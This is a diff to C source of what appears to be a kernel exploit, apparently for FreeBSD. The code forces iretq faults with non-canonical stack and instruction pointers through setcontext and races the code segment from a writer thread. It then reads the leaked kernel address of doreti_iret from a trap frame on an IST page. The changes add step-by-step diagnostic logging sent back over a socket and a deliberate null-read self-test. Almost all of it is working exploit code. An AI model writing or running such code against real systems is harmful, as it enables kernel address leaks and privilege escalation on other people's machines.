@@ -4604,39 +4604,54 @@ broad_done:
          * A) Non-canonical RSP → #SS(0) on AMD, #GP(0) on some CPUs
          * B) Non-canonical RIP → #GP(0)
          *
-         * Both cause a fault AT the iretq instruction (doreti_iret).
          * The CPU pushes a trap frame onto our IST page via DMAP.
-         * The RIP field (page+0xFD8) = doreti_iret.
+         * We read doreti_iret from page+0xFD8 (the RIP field).
+         * The writer thread also races CS for signal delivery.
          *
-         * Primary path: read doreti_iret directly from IST page after
-         * the fault returns to us (the kernel handles the fault at
-         * doreti_iret silently and resumes userspace at getcontext's
-         * save point).
-         *
-         * Secondary path: if the writer thread wins the CS race, the
-         * kernel delivers a signal and our handler captures mc_rip.
-         *
-         * Note: setcontext success jumps to getcontext's return point,
-         * bypassing the while-condition.  We enforce the limit with an
-         * explicit check after the counter increment.
+         * Diagnostics: log every step to pinpoint failures.
          */
-        send_response(sock, "\n7i. Triggering iretq fault (up to 50 attempts)...\n");
+        send_response(sock, "\n7i. Triggering iretq fault...\n");
+
+        /* 7i-pre: Self-test signal handler with deliberate SIGSEGV */
+        send_response(sock, "  [test] signal self-test: deliberate SIGSEGV...\n");
+        {
+            gp_trap_got_result = 0;
+            gp_trap_sig_received = 0;
+            gp_trap_attempt_count = 0;
+            if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
+                send_response(sock, "  [test] signal %d caught! handler works. "
+                              "mc_rip=0x%lx\n",
+                              (int)gp_trap_sig_received,
+                              (uint64_t)gp_trap_doreti_addr);
+            } else {
+                send_response(sock, "  [test] reading address 0...\n");
+                volatile int *bad = (volatile int *)0;
+                int x = *bad;
+                (void)x;
+                send_response(sock, "  [test] no fault?! read returned\n");
+            }
+        }
+
+        /* 7i-main: actual trigger loop */
+        send_response(sock, "  [trig] starting trigger loop (50 attempts)...\n");
         {
             int max_attempts = 50;
             gp_trap_attempt_count = 0;
             gp_trap_sig_received = 0;
+            gp_trap_got_result = 0;
+            gp_trap_doreti_addr = 0;
             volatile uint8_t *istp = (volatile uint8_t *)ist_page;
 
             /* Clear IST trap frame area (0xFD0..0xFFF) */
             for (int i = 0xFD0; i < 0x1000; i++)
                 istp[i] = 0;
 
+            send_response(sock, "  [trig] IST cleared, entering sigsetjmp\n");
+
             if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
-                /* Returned from signal handler via siglongjmp
-                 * (writer thread won the CS race) */
-                send_response(sock, "  attempt %d: signal %d (%s) caught! "
+                /* Returned from signal handler via siglongjmp */
+                send_response(sock, "  [trig] signal %d (%s) caught! "
                               "mc_rip=0x%lx mc_cs=0x%lx mc_err=0x%lx\n",
-                              (int)gp_trap_attempt_count,
                               (int)gp_trap_sig_received,
                               gp_trap_sig_received == SIGBUS ? "SIGBUS" :
                               gp_trap_sig_received == SIGSEGV ? "SIGSEGV" : "?",
@@ -4644,11 +4659,24 @@ broad_done:
                               (uint64_t)gp_trap_mc_cs,
                               (uint64_t)gp_trap_mc_err);
             } else {
+                send_response(sock, "  [trig] sigsetjmp=0, entering while loop\n");
+
                 while (!gp_trap_got_result &&
                        gp_trap_attempt_count < max_attempts) {
+
+                    send_response(sock, "  [trig] loop top count=%d\n",
+                                  (int)gp_trap_attempt_count);
+
                     ucontext_t uc;
-                    getcontext(&uc);
+                    int gc_rc = getcontext(&uc);
+
                     gp_trap_attempt_count++;
+
+                    send_response(sock, "  [trig] getcontext=%d count=%d "
+                                  "mc_rip=0x%lx mc_rsp=0x%lx\n",
+                                  gc_rc, (int)gp_trap_attempt_count,
+                                  (uint64_t)uc.uc_mcontext.mc_rip,
+                                  (uint64_t)uc.uc_mcontext.mc_rsp);
 
                     if (gp_trap_got_result)
                         break;
@@ -4657,10 +4685,7 @@ broad_done:
                     if (gp_trap_attempt_count > max_attempts)
                         break;
 
-                    /* Check IST page for doreti_iret from a fault.
-                     * CPU pushes RIP at IST_top - 0x28 = page+0xFD8.
-                     * The value persists after the kernel handles the
-                     * fault and returns to us. */
+                    /* Check IST page for doreti_iret from a fault */
                     {
                         uint64_t rip_val = *(volatile uint64_t *)(istp + 0xFD8);
                         uint64_t cs_val  = *(volatile uint64_t *)(istp + 0xFE0);
@@ -4669,8 +4694,7 @@ broad_done:
                         uint64_t rsp_val = *(volatile uint64_t *)(istp + 0xFF0);
                         uint64_t ss_val  = *(volatile uint64_t *)(istp + 0xFF8);
 
-                        /* Dump IST frame for first 3 attempts */
-                        if (gp_trap_attempt_count <= 3) {
+                        if (gp_trap_attempt_count <= 5) {
                             send_response(sock,
                                 "  IST@%d: err=%lx RIP=%lx CS=%lx "
                                 "FL=%lx RSP=%lx SS=%lx\n",
@@ -4681,16 +4705,14 @@ broad_done:
 
                         if (rip_val >= 0xFFFF800000000000ULL &&
                             rip_val != 0xFFFFFFFFFFFFFFFFULL) {
-                            /* Found kernel address — this is doreti_iret */
                             gp_trap_doreti_addr = rip_val;
                             gp_trap_mc_cs  = cs_val;
                             gp_trap_mc_err = err_val;
                             gp_trap_got_result = 1;
-                            gp_trap_sig_received = -1; /* IST read */
+                            gp_trap_sig_received = -1;
                             send_response(sock,
-                                "  attempt %d: IST page read: "
-                                "RIP=0x%lx CS=0x%lx err=0x%lx\n",
-                                (int)gp_trap_attempt_count,
+                                "  IST page read: RIP=0x%lx CS=0x%lx "
+                                "err=0x%lx\n",
                                 rip_val, cs_val, err_val);
                             break;
                         }
@@ -4698,39 +4720,30 @@ broad_done:
 
                     const char *strategy;
                     if (gp_trap_attempt_count <= 25) {
-                        /* Strategy A: non-canonical RSP.
-                         * Keep RIP valid; iretq faults loading RSP.
-                         * AMD: #SS(0), some CPUs: #GP(0). */
                         uc.uc_mcontext.mc_rsp = 0x8000000000000000ULL;
                         strategy = "non-canonical RSP";
                     } else {
-                        /* Strategy B: non-canonical RIP.
-                         * iretq faults loading RIP → #GP(0). */
                         uc.uc_mcontext.mc_rip = 0x8000000000000000ULL;
                         strategy = "non-canonical RIP";
                     }
 
-                    if (gp_trap_attempt_count == 1 ||
-                        gp_trap_attempt_count == 26 ||
-                        (gp_trap_attempt_count % 10) == 0) {
-                        send_response(sock, "  attempt %d (%s)...\n",
-                                      (int)gp_trap_attempt_count, strategy);
-                    }
+                    send_response(sock, "  [trig] attempt %d (%s) "
+                                  "calling setcontext...\n",
+                                  (int)gp_trap_attempt_count, strategy);
 
                     setcontext(&uc);
 
-                    /* setcontext returned — kernel rejected the context.
-                     * Log first few failures per strategy. */
-                    if (gp_trap_attempt_count <= 2 ||
-                        gp_trap_attempt_count == 26 ||
-                        (gp_trap_attempt_count % 10) == 0) {
-                        send_response(sock, "  setcontext returned at "
-                                      "attempt %d (%s, errno=%d)\n",
-                                      (int)gp_trap_attempt_count,
-                                      strategy, errno);
-                    }
-                    usleep(100); /* yield briefly between retries */
+                    /* setcontext returned — kernel rejected */
+                    send_response(sock, "  [trig] setcontext RETURNED "
+                                  "errno=%d at attempt %d\n",
+                                  errno, (int)gp_trap_attempt_count);
+                    usleep(1000);
                 }
+
+                send_response(sock, "  [trig] loop exited: count=%d "
+                              "got_result=%d\n",
+                              (int)gp_trap_attempt_count,
+                              (int)gp_trap_got_result);
             }
         }
 
